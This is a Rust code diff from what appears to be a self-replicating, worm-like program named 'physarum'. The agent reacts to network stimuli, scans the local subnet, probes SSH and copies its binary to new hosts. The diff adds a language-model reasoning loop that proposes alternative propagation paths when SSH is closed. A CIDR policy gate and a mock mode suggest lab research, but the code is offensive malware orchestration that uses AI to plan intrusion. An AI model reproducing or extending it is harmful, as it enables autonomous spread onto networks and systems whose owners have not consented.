@@ -17,19 +17,84 @@
 ///   9. Update lineage + save /tmp/physarum-lineage.json
 use crate::{
     lineage::Lineage,
+    llm_loop::{self, LlmOutcome},
     propagation::{self, Outcome},
     Cli, Mode,
 };
 use anyhow::Result;
+use physarum_llm::{MockLlmClient, OpenAiCompatibleClient, PolicyGate, PropagationMethodClass};
 use std::collections::HashSet;
 use std::net::Ipv4Addr;
 use std::path::Path;
+use std::str::FromStr;
+use std::sync::Arc;
 use std::time::Duration;
 use tokio::net::TcpStream;
 use tokio::sync::mpsc;
 use tokio::time::timeout;
 
+/// Resolved LLM configuration — None means LLM is disabled.
+struct LlmConfig {
+    client: Arc<dyn physarum_llm::LlmClient>,
+    gate: PolicyGate,
+}
+
+impl LlmConfig {
+    fn from_cli(cli: &Cli) -> Option<Self> {
+        let endpoint = cli.llm_endpoint.as_deref()?;
+
+        // Parse allowed CIDR for PolicyGate
+        let allowed_cidrs = parse_cidr(cli.llm_allowed_cidr.as_deref()).unwrap_or_default();
+
+        let mut gate = PolicyGate::lab_default();
+        gate.allowed_cidrs = allowed_cidrs;
+
+        let allowed_methods = vec![
+            PropagationMethodClass::Ssh,
+            PropagationMethodClass::Http,
+            PropagationMethodClass::NoPath,
+        ];
+
+        let client: Arc<dyn physarum_llm::LlmClient> = if endpoint == "mock" {
+            Arc::new(MockLlmClient::no_path("mock mode — no real LLM"))
+        } else {
+            let api_key = cli.llm_api_key.clone().unwrap_or_default();
+            match OpenAiCompatibleClient::new(
+                endpoint,
+                &cli.llm_model,
+                api_key,
+                cli.llm_timeout_ms,
+                allowed_methods,
+            ) {
+                Ok(c) => Arc::new(c),
+                Err(e) => {
+                    tracing::warn!(err = %e, "failed to build LLM client — LLM disabled");
+                    return None;
+                }
+            }
+        };
+
+        tracing::info!(
+            endpoint,
+            model = %cli.llm_model,
+            cidrs = ?cli.llm_allowed_cidr,
+            "LLM reasoning enabled"
+        );
+
+        Some(LlmConfig { client, gate })
+    }
+}
+
+fn parse_cidr(cidr: Option<&str>) -> Option<Vec<(std::net::Ipv4Addr, u8)>> {
+    let cidr = cidr?;
+    let (ip_str, prefix_str) = cidr.split_once('/')?;
+    let ip = std::net::Ipv4Addr::from_str(ip_str).ok()?;
+    let prefix = prefix_str.parse::<u8>().ok()?;
+    Some(vec![(ip, prefix)])
+}
+
 pub async fn run(cli: Cli) -> Result<()> {
+    let llm = LlmConfig::from_cli(&cli);
     let mut lineage = init_lineage(&cli)?;
     lineage.save()?;
 
@@ -74,7 +139,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "icmp", &mut lineage, &binary_path, &mut attempted,
+                            ip, "icmp", &mut lineage, &binary_path, &mut attempted, &llm,
                         ).await?;
                     }
                     None => {
@@ -90,7 +155,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted,
+                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted, &llm,
                         ).await?;
                     }
                     None => {
@@ -106,7 +171,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     let candidates = crate::discovery::scan_local_subnet(my_ip).await;
                     for ip in candidates {
                         handle_candidate(
-                            ip, "discovery", &mut lineage, &binary_path, &mut attempted,
+                            ip, "discovery", &mut lineage, &binary_path, &mut attempted, &llm,
                         ).await?;
                     }
                 }
@@ -124,7 +189,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "ebpf", &mut lineage, &binary_path, &mut attempted,
+                            ip, "ebpf", &mut lineage, &binary_path, &mut attempted, &llm,
                         ).await?;
                     }
                     None => {
@@ -162,6 +227,7 @@ async fn handle_candidate(
     lineage: &mut Lineage,
     binary_path: &Path,
     attempted: &mut HashSet<Ipv4Addr>,
+    llm: &Option<LlmConfig>,
 ) -> Result<()> {
     let ip_str = src_ip.to_string();
 
@@ -193,6 +259,25 @@ async fn handle_candidate(
     tracing::info!(%src_ip, stimulus, "stimulus received — confirming SSH on port 22");
 
     if !port_22_open(src_ip).await {
+        // Port 22 closed — Causal Continuity Paradox territory.
+        // If LLM reasoning is enabled, ask it for an alternative propagation path
+        // before giving up. Without LLM, fall through to dead-end scoring.
+        if let Some(cfg) = llm {
+            tracing::info!(%src_ip, stimulus, "port 22 closed — handing off to LLM reasoning loop");
+            match llm_loop::run(src_ip, lineage, cfg.client.as_ref(), &cfg.gate).await? {
+                LlmOutcome::Propagated => {
+                    tracing::info!(%src_ip, "LLM propagation succeeded");
+                    lineage.save()?;
+                    return Ok(());
+                }
+                LlmOutcome::DeadEnd => {
+                    tracing::warn!(%src_ip, "LLM exhausted — marking dead end");
+                    lineage.mark_dead_end(&ip_str);
+                    lineage.save()?;
+                    return Ok(());
+                }
+            }
+        }
         tracing::warn!(%src_ip, "port 22 not open — dead end");
         lineage.mark_dead_end(&ip_str);
         lineage.save()?;
